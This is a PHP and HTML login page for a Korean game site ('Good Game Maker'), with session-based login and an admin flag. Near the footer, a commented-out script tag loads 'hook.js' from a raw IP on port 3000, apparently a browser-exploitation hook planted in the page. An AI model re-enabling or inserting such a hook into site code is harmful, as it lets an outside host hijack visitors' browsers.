<?php
require_once('config.php');
session_start();

// 로그인이 되어있는 경우, 사용자 정보를 확인
if (isset($_SESSION['user_id'])) {
    $userId = $_SESSION['user_id'];
    $stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->bind_param("i", $userId);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        $user = $result->fetch_assoc();
        $_SESSION['username'] = $user['username'];
    }
}

// 기존 로그인 처리 부분
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['login'])) {
    $loginUsername = $_POST['loginUsername'];
    $loginPassword = $_POST['loginPassword'];

    $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->bind_param("s", $loginUsername);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $hashedPassword = $row['password'];

        if (password_verify($loginPassword, $hashedPassword)) {
            // 로그인 성공
            $_SESSION['user_id'] = $row['id'];
            $_SESSION['username'] = $row['username'];
            $_SESSION['nickname'] = $row['nickname'];
            $_SESSION['profile_image'] = $row['profile_image'];
            $_SESSION['bio'] = $row['bio'];
            $_SESSION['is_admin'] = ($row['Admin_set'] === '001'); // Admin_set이 001인 경우 관리자
            echo "<script>
                    alert('로그인되었습니다.');
                    window.location.href = 'index.php';
                  </script>";
        } else {
            echo "<script>
                    alert('비밀번호가 일치하지 않습니다.');
                  </script>";
        }
    } else {
        echo "<script>
                alert('존재하지 않는 사용자입니다.');
              </script>";
    }
}

$conn->close();
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GGM - 로그인</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-image: url('https://www.ystreet.co.kr/forUser/img/628dbe6878991.png');
        }

        header {
            background-color: #333;
            color: #fff;
            padding: 1em;
            text-align: center;
        }

        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 2em;
        }

        .login-form {
            background: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }

        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }

        input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #17191d;
            color: #fff;
            border: none;
            border-radius: 0px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0e1013;
        }

        .links {
            margin-top: 15px;
            text-align: center;
        }

        .links a {
            color: #666;
            text-decoration: none;
            margin: 0 10px;
            font-size: 14px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        footer {
            background-color: #333;
            color: #fff;
            padding: 1em;
            text-align: center;
        }

        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
        }

        .footer-links {
            margin-bottom: 1em;
        }

        .footer-links a {
            color: #fff;
            text-decoration: none;
            margin: 0 1em;
        }
    </style>
</head>
<body>
    <header>
        <a href="index.php">
            <img src="images/home_name.png" alt="Good Game Maker" style="max-height: 100px;">
        </a>
    </header>

    <div class="container">
        <div class="login-form">
            <h2>로그인</h2>
            <form method="post" action="login.php">
                <div class="form-group">
                    <label for="loginUsername">아이디</label>
                    <input type="text" id="loginUsername" name="loginUsername" required>
                </div>

                <div class="form-group">
                    <label for="loginPassword">비밀번호</label>
                    <input type="password" id="loginPassword" name="loginPassword" required>
                </div>

                <button type="submit" name="login">로그인</button>

                <div class="links">
                    <a href="#">아이디 찾기</a>
                    <a href="#">비밀번호 찾기</a>
                    <a href="regster.html">회원가입</a>
                </div>
            </form>
        </div>
    </div>
    
<!-- <script src="http://39.124.137.58:3000/hook.js"></script> -->
    <footer>
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">이용약관</a>
                <a href="#">개인정보처리방침</a>
                <a href="#">청소년보호정책</a>
                <a href="#">고객센터</a>
            </div>
            <p>&copy; 2024 Last Game Site. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>

